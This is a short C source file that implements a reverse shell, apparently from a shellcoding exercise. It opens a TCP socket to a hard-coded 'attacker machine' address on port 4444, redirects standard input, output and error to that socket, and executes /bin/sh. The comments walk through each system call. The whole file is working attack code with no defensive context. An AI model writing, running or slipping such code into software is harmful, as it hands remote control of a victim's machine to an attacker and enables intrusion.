#include <sys/types.h>
#include <sys/socket.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(void)

{	

	int sock_file_des;
	struct sockaddr_in sock_ad;
	//[1] create socket connection
	//Man page: socket(int domain, int type, int protocol);
	
	sock_file_des = socket(AF_INET, SOCK_STREAM, 0);


	//[2]connect back to attacker machine (ip= 192.168.227.129)
	//Man page: int connect(int sockfd, const struct sockaddr *addr,socklen_t addrlen);

	sock_ad.sin_family = AF_INET; 
	sock_ad.sin_port = htons(4444);
	sock_ad.sin_addr.s_addr = inet_addr("192.168.227.129");
	
	connect(sock_file_des,(struct sockaddr *) &sock_ad,sizeof(sock_ad));
	
	//[3]Redirect file descriptors (STDIN, STDOUT and STDERR) to the socket using DUP2
	//Man page: int dup2(int oldfd, int newfd);

	dup2(sock_file_des, 0); //	stdin
	dup2(sock_file_des, 1); //	stdout
	dup2(sock_file_des, 2); //	stderr

	//[4]Execute shell (here we use /bin/sh) using execve call

	//[*]Man page for execve call
	//int execve(const char *filename, char *const argv[],char *const envp[]);
	

	execve("/bin/sh", 0, 0);
	
	
}


